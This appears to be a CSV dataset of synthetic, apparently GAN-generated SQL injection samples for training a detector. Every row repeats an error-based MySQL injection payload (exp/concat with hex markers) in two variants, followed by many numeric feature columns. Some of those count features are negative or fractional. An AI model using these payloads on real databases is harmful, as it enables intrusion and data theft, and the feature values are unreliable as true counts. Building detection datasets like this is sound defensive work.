id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000001,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.986788380399887,261.4964294433594,61.1826286315918,35.84056854248047,105.2108154296875,-2.038297414779663,84.62210845947266,44.41005325317383,0.7191690802574158,0.2697312831878662,0.16632243990898132,0.4012308418750763,0.13298261165618896,3.6638407707214355,0.9954918026924133,1.1310083866119385,0.5169034004211426,0.17944537103176117,0.07569288462400436,0.32471197843551636,9.12243366241455,9.815256118774414,2.4663822650909424,0.08115985244512558,1.851870059967041,0.21714234352111816,-0.15670055150985718,-0.13810908794403076,0.07096535712480545,0.6598984599113464,-0.09818063676357269,-0.17175351083278656,1.3807039260864258,0.043363191187381744,0.26814714074134827,2.3065147399902344,8.188986778259277,0.9565934538841248,1.9437611103057861,0.12323392927646637,0.3371371328830719,1.1008317470550537,-0.2685503661632538,0.03465540334582329,0.45498573780059814,-0.42074844241142273,-0.020603448152542114,0.5380217432975769,0.4874545633792877,0.5766668319702148,0.12079576402902603,0.1423104852437973,-0.1692185401916504,0.2518216073513031,0.15162427723407745,-0.002573806792497635,0.020588934421539307,0.27505651116371155,0.060418032109737396,0.2552317678928375,0.07948661595582962,-0.07402864843606949,-0.26734304428100586,-0.018839752301573753,0.27578651905059814,-0.010794341564178467,0.3590526580810547,0.5585875511169434,0.12916260957717896,0.17458322644233704,-0.18694475293159485,-0.175629124045372,0.011175420135259628,0.08179237693548203,0.11478076130151749,0.0062765018083155155,1.6433825492858887,0.308009535074234,-0.21072833240032196,0.06584877520799637,0.257844477891922,7.7250800132751465,0.9614673852920532,0.21786193549633026,-0.033000875264406204,0.4625879228115082,0.06181638687849045,0.01623326539993286,-0.04276604950428009
GAN_000002,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.622111357283865,258.9349365234375,77.15371704101562,35.05852127075195,101.11067962646484,5.753651142120361,73.4095687866211,39.62643814086914,0.9011028409004211,0.32101956009864807,0.1528243124485016,0.3966265022754669,0.1314532607793808,3.788642168045044,1.369053840637207,0.730985701084137,0.49717041850090027,0.07432284951210022,0.0784664899110794,0.1281566619873047,9.61264705657959,9.469740867614746,2.840331554412842,0.15595509111881256,1.9623963832855225,0.10523586720228195,0.0753961130976677,0.07367410510778427,0.03580551967024803,0.5597399473190308,0.04183643311262131,-0.15578565001487732,1.4064967632293701,0.01609431952238083,0.30524569749832153,2.1515562534332275,7.910233020782471,1.0512117147445679,2.015639543533325,0.1920229196548462,0.39412665367126465,0.9323936700820923,-0.011646389961242676,0.05520634353160858,0.0012708380818367004,-0.09324926137924194,-0.15154249966144562,0.4357258975505829,0.4007776081562042,0.47349226474761963,0.3074628710746765,0.2960834503173828,-0.15868142247200012,0.06776747107505798,0.22791673243045807,0.0015056355623528361,0.016126643866300583,-0.14712336659431458,0.14630496501922607,0.21437707543373108,-0.05076441913843155,-0.056610751897096634,-0.01801886409521103,0.005609530955553055,0.16863395273685455,-0.03937458619475365,0.4398963749408722,0.1796991378068924,0.0388140007853508,0.038928475230932236,0.11279071867465973,0.022664444521069527,0.14961788058280945,0.09361003339290619,0.05539020895957947,-0.001346520846709609,1.2373011112213135,0.38426363468170166,-0.073187917470932,0.058609701693058014,0.21841365098953247,7.999602317810059,0.8119985461235046,0.13272030651569366,0.04038825258612633,0.5721040964126587,0.025841787457466125,0.04612916707992554,-0.00121336430311203
GAN_000003,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.832478741966716,258.5301513671875,74.30182647705078,37.842777252197266,95.39292907714844,6.213615894317627,73.88614654541016,40.498966217041016,1.1818903684616089,0.28556984663009644,0.14819523692131042,0.4026944637298584,0.12851567566394806,3.6728482246398926,1.1708356142044067,1.1070219278335571,0.8376320004463196,0.14667101204395294,0.05659741535782814,-0.14365366101264954,9.456631660461426,9.381719589233398,2.375072956085205,0.1435433179140091,1.9603418111801147,0.16220532357692719,0.13941921293735504,0.12287891656160355,0.088450126349926,0.5345538854598999,-0.022792845964431763,-0.03586747497320175,1.6742639541625977,0.12980028986930847,0.30991673469543457,2.3425071239471436,7.349168300628662,0.9330239295959473,2.03550386428833,0.041545569896698,0.45849406719207764,0.8742814064025879,0.09328235685825348,0.052256662398576736,0.12090039998292923,-0.15984973311424255,-0.17354312539100647,0.46834737062454224,0.45009562373161316,0.43923571705818176,0.24721816182136536,0.31998685002326965,-0.24864652752876282,0.25611841678619385,0.20482629537582397,0.08183722198009491,0.1042630597949028,0.17969970405101776,-0.18277376890182495,0.13447901606559753,0.06316343694925308,0.12757256627082825,-0.18957734107971191,0.05669143795967102,0.2991621494293213,-0.07258713990449905,0.6388237476348877,-0.036234259605407715,0.1150565892457962,-0.009074941277503967,0.10600560903549194,-0.27261611819267273,-0.028493959456682205,0.04538557678461075,0.06336783617734909,0.016421210020780563,1.2162669897079468,0.3431869447231293,0.019542794674634933,0.07004456222057343,0.13955318927764893,7.89021635055542,0.7384935617446899,0.1470400094985962,0.0052599115297198296,0.6291531920433044,-0.038674093782901764,-0.22866222262382507,0.059563130140304565
GAN_000004,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.96982697373635,255.83929443359375,67.4936294555664,34.10358428955078,97.0989990234375,1.7869722843170166,78.87495422363281,43.35215759277344,0.787581205368042,0.28339895606040955,0.1657233089208603,0.3976544141769409,0.12950947880744934,3.7357125282287598,0.9960407018661499,0.8384348750114441,0.4307705760002136,0.14820680022239685,0.0699983686208725,0.13162530958652496,10.068631172180176,9.186761856079102,2.257831335067749,0.06624877452850342,1.8415920734405518,0.19690954685211182,-0.039264678955078125,-0.08351431041955948,0.07658148556947708,0.6291910409927368,0.05251479893922806,-0.3797896206378937,1.4165840148925781,-0.07643954455852509,0.2602120041847229,2.2953124046325684,8.204609870910645,0.9994238018989563,2.0202980041503906,0.00527895987033844,0.523777425289154,0.9664077758789062,-0.09950903803110123,0.036487385630607605,0.3039821684360504,-0.3953496515750885,0.010321661829948425,0.4740515649318695,0.4901771545410156,0.5961191058158875,0.26373961567878723,0.1752418428659439,-0.03543031960725784,0.19354727864265442,0.20324358344078064,0.01860920339822769,0.008291691541671753,0.07615426182746887,-0.0046171098947525024,0.41859573125839233,-0.0437423437833786,-0.043527305126190186,-0.15882542729377747,0.1266304850578308,0.25221261382102966,0.19298270344734192,0.4165453612804413,0.41995829343795776,0.10066278278827667,-0.0021535679697990417,-0.1473303884267807,-0.1551361083984375,0.23032522201538086,-0.0718388706445694,0.07271717488765717,0.0017133932560682297,1.3847755193710327,0.322796106338501,-0.26854169368743896,0.09489136934280396,0.26397883892059326,7.703421115875244,0.9949485063552856,0.18999676406383514,0.022740505635738373,0.5735676884651184,0.18583422899246216,-0.07687704265117645,0.12844252586364746
GAN_000005,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.808674278851556,258.57275390625,65.23719787597656,36.68858337402344,102.316650390625,0.896142303943634,81.91300201416016,43.34699630737305,0.8666395545005798,0.27236565947532654,0.15790340304374695,0.39399176836013794,0.13221396505832672,3.7530276775360107,1.345468521118164,0.7494072914123535,0.502185046672821,0.12127050012350082,0.04512804001569748,0.269925981760025,9.35255241394043,9.876839637756348,2.6967196464538574,0.055180568248033524,1.8400211334228516,0.14583708345890045,-0.22169719636440277,-0.054241571575403214,0.05702155455946922,0.5861326456069946,0.01987501233816147,-0.26174288988113403,1.467791199684143,0.14044520258903503,0.28741079568862915,2.103012800216675,7.695046424865723,0.8579981923103333,1.806435465812683,0.1083291620016098,0.440100759267807,1.0489014387130737,-0.04950403422117233,0.029335713014006615,0.2655235528945923,-0.11514171957969666,-0.02496475726366043,0.49262934923171997,0.49936965107917786,0.5399609804153442,0.2547411024570465,0.2652517259120941,-0.010130845010280609,-0.058866437524557114,0.14604707062244415,0.034740421921014786,0.022817879915237427,0.21665692329406738,-0.07654166221618652,0.27775195240974426,-0.07212202250957489,0.15684719383716583,-0.06996572762727737,-0.0067537203431129456,0.22512730956077576,0.09640766680240631,0.37939178943634033,0.3088853359222412,0.1464885175228119,-0.020003683865070343,-0.22708481550216675,-0.19242745637893677,0.1383395493030548,0.04617241024971008,0.04945758357644081,0.009556952863931656,1.3656522035598755,0.24105004966259003,-0.16318544745445251,0.0858728289604187,0.21308507025241852,7.758626937866211,0.9636495113372803,0.19794291257858276,-0.04830145463347435,0.5190973877906799,0.06738343834877014,0.0891457349061966,0.002144820988178253
GAN_000006,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,5.163147749433507,265.8402404785156,78.20269012451172,36.31116485595703,100.83440399169922,5.068265438079834,78.04340362548828,43.96308517456055,1.2463171482086182,0.25390520691871643,0.13803169131278992,0.3991859555244446,0.13018855452537537,3.655858278274536,1.3831703662872314,1.6025311946868896,0.9314562678337097,0.08220738172531128,0.06171375513076782,0.08656586706638336,9.514888763427734,8.885980606079102,2.8315980434417725,0.12215238809585571,1.7823983430862427,0.0981583297252655,0.31513819098472595,-0.009997565299272537,0.050871409475803375,0.5624568462371826,-0.12713629007339478,0.12065259367227554,1.5824785232543945,0.5255879759788513,0.36089783906936646,2.117659091949463,6.026339054107666,0.6525676250457764,1.8692595958709717,0.005044117569923401,0.5405017137527466,1.184090256690979,-0.12980833649635315,0.00938925426453352,0.18974295258522034,-0.12256225943565369,-0.38041502237319946,0.5686771273612976,0.4014476239681244,0.49052608013153076,0.1168033555150032,0.4400843381881714,-0.4885959029197693,0.3108553886413574,0.19175074994564056,0.027533750981092453,0.08396878838539124,0.3005885183811188,0.21860069036483765,0.14077678322792053,-0.09977006167173386,0.45466482639312744,-0.3027096688747406,-0.14555327594280243,0.3071412146091461,-0.11683031916618347,0.5578246712684631,0.11593222618103027,0.3587537407875061,-0.09486713260412216,-0.09204024076461792,-0.43868592381477356,-0.11177065968513489,0.11235124617815018,0.09354735910892487,0.02054266631603241,1.356932282447815,0.11942148953676224,-0.024684086441993713,-0.0968351736664772,0.06724594533443451,7.40144681930542,0.9016901850700378,0.1998179852962494,-0.11533917486667633,0.5915822386741638,0.015279173851013184,0.12302475422620773,0.021181806921958923
GAN_000007,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.936262649673089,258.70574951171875,72.1758804321289,35.62969207763672,95.45123291015625,2.36889386177063,78.22705078125,42.39134216308594,1.0327192544937134,0.28553342819213867,0.15532228350639343,0.39953818917274475,0.12682181596755981,3.707789897918701,1.071738839149475,0.9717932939529419,0.5551130175590515,0.1281856894493103,0.04358460009098053,0.009527474641799927,11.055240631103516,9.80683708190918,2.3193910121917725,0.06887708604335785,1.8708477020263672,0.16204003989696503,0.10889444500207901,-0.0032454021275043488,0.017748916521668434,0.492011159658432,-0.03178894519805908,-0.08520113676786423,1.494360089302063,-0.03497408330440521,0.3390606939792633,2.3101696968078613,7.972784519195557,1.014901876449585,2.1030466556549072,0.14096200466156006,0.5210150480270386,1.023486852645874,-0.10534083098173141,0.033483460545539856,0.27431848645210266,-0.28143545985221863,-0.12154453247785568,0.449708491563797,0.467268168926239,0.553496241569519,0.19932392239570618,0.2372332066297531,-0.16098523139953613,0.21642142534255981,0.22465068101882935,-0.0033656321465969086,0.04929907247424126,-0.04668639972805977,0.05187142640352249,0.4094359278678894,0.036032356321811676,0.07758766412734985,-0.13802146911621094,-0.0022739656269550323,0.3134553134441376,0.09069077670574188,0.5474367141723633,0.19205011427402496,0.012201890349388123,-0.15385547280311584,0.0113060362637043,-0.15670223534107208,0.10516050457954407,-0.05132336914539337,0.07295401394367218,0.004725239705294371,1.2457051277160645,0.3721650242805481,-0.19012372195720673,0.0639035627245903,0.2040487825870514,7.694694519042969,0.9026477336883545,0.1750180721282959,0.016157042235136032,0.5927810072898865,0.030891574919223785,-0.12631770968437195,0.19338707625865936
GAN_000008,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.874511326444725,267.02728271484375,64.982177734375,34.570682525634766,92.64895629882812,0.8380835652351379,80.98665618896484,46.58198928833008,1.09095299243927,0.24576406180858612,0.1570790857076645,0.4009286165237427,0.13311222195625305,3.6944046020507812,1.2380077838897705,1.2088876962661743,0.6209242343902588,0.18483151495456696,0.0680699422955513,-0.05755162984132767,9.872389793395996,8.783272743225098,1.7393510341644287,0.03455115854740143,2.026263952255249,0.19123362004756927,-0.04990782588720322,-0.12253767997026443,0.07583775371313095,0.7491500377655029,0.1034090593457222,-0.18295413255691528,1.3492085933685303,0.18900111317634583,0.2455679476261139,2.2234933376312256,7.447145938873291,0.5324325561523438,2.0501928329467773,0.10402116179466248,0.479679137468338,1.0197594165802002,0.021368611603975296,0.04975103959441185,0.31782519817352295,-0.22718781232833862,-0.14400362968444824,0.4628746807575226,0.383497953414917,0.5394091606140137,0.14643995463848114,0.36388182640075684,-0.1808103322982788,0.20319253206253052,0.17702457308769226,0.02099742367863655,0.0012844244483858347,0.1226201206445694,-8.45193862915039e-05,-0.023663736879825592,0.005418241024017334,0.26621630787849426,-0.1325320303440094,-0.03277948871254921,0.24710127711296082,-0.08696643263101578,0.5259482860565186,0.45816904306411743,0.10721930861473083,0.013534992933273315,-0.10702149569988251,-0.1351466029882431,0.1462608277797699,0.26962095499038696,0.08419705927371979,0.021725114434957504,1.341509461402893,0.14209850132465363,-0.22242291271686554,0.03868398070335388,0.2873944938182831,8.272883415222168,0.9292137622833252,0.1672738492488861,-0.014904790557920933,0.5807782411575317,0.13040117919445038,0.2922528386116028,-0.09101012349128723
GAN_000009,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,5.165984584175342,262.98590087890625,62.58805847167969,37.60614776611328,101.38264465332031,3.537104368209839,85.60733032226562,44.34202194213867,0.7753128409385681,0.26214733719825745,0.1474355012178421,0.39351898431777954,0.1315915733575821,3.701155424118042,1.0740959644317627,0.9131281971931458,0.57208251953125,0.11637680232524872,0.0576484315097332,0.024074940010905266,10.511329650878906,10.1862211227417,2.3470211029052734,0.16859477758407593,1.8984066247940063,0.20723141729831696,-0.12999452650547028,-0.1475171446800232,0.05003506317734718,0.7158525586128235,-0.15835262835025787,-0.27638593316078186,1.3803502321243286,-0.019151560962200165,0.25490856170654297,2.3641514778137207,8.069947242736816,0.8862730264663696,1.8746049404144287,-0.06795012950897217,0.5791249871253967,1.1410502195358276,-0.14720827341079712,0.019190767779946327,0.4920063614845276,-0.18814325332641602,-0.1890917271375656,0.5299303531646729,0.5157314538955688,0.6238093376159668,0.17864635586738586,0.25568774342536926,-0.12522995471954346,0.30359840393066406,0.24083103239536285,-0.002208080142736435,-0.0033682321663945913,0.10189993679523468,0.12787887454032898,0.35807785391807556,0.1938580870628357,0.20099809765815735,-0.21445494890213013,-0.07401160150766373,0.2516809105873108,0.14790113270282745,0.32987454533576965,0.4074391722679138,0.15515661239624023,0.012038618326187134,-0.43726667761802673,-0.09088695794343948,0.1454051434993744,-0.01827526092529297,0.0701492503285408,0.007540074177086353,1.4395513534545898,0.20449979603290558,-0.1681133657693863,0.008175662718713284,0.20237785577774048,8.056051254272461,1.015433669090271,0.2186552733182907,-0.037959616631269455,0.477418452501297,-0.0191967710852623,0.2016257345676422,0.34134626388549805
GAN_000010,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.744248656709202,252.33607482910156,67.04618835449219,35.68741989135742,103.99127960205078,0.9984543919563293,79.95692443847656,45.87335968017578,0.9153209328651428,0.2629386782646179,0.15722109377384186,0.3939528167247772,0.1339380294084549,3.6737637519836426,1.3567153215408325,0.9360626935958862,0.6225769519805908,0.17928557097911835,0.04335979372262955,0.28016483783721924,9.336223602294922,9.639839172363281,2.681812286376953,0.138515442609787,1.853082299232483,0.1836397498846054,-0.23433680832386017,-0.08403746038675308,-0.008429565466940403,0.685768723487854,-0.19791486859321594,-0.11993379145860672,1.427203893661499,0.14179641008377075,0.3301658034324646,2.1914620399475098,7.807862281799316,0.6790978312492371,1.9157286882400513,0.06505146622657776,0.4128651022911072,1.1277215480804443,-0.1060563400387764,0.02664046175777912,0.4009701609611511,-0.12189261615276337,-0.10831183195114136,0.4561780095100403,0.43995076417922974,0.5074135065078735,0.06724957376718521,0.2968733310699463,0.05322100967168808,0.13832905888557434,0.16720440983772278,-0.0036085881292819977,0.039011452347040176,0.10635226964950562,0.06805240362882614,0.12065251916646957,0.08015061169862747,0.011178307235240936,-0.21677082777023315,0.07365532964468002,0.22523511946201324,-0.0056555382907390594,0.43528610467910767,0.30196183919906616,0.17945170402526855,0.09969668835401535,-0.2407349944114685,-0.17125649750232697,0.014066662639379501,0.24752941727638245,0.061604104936122894,0.013049330562353134,1.5649718046188354,0.2262822985649109,-0.23128066956996918,0.02858947217464447,0.24459348618984222,8.280048370361328,0.9300079941749573,0.18755806982517242,-0.05249073728919029,0.5359170436859131,-0.04957371950149536,0.2891455590724945,-0.08629526942968369
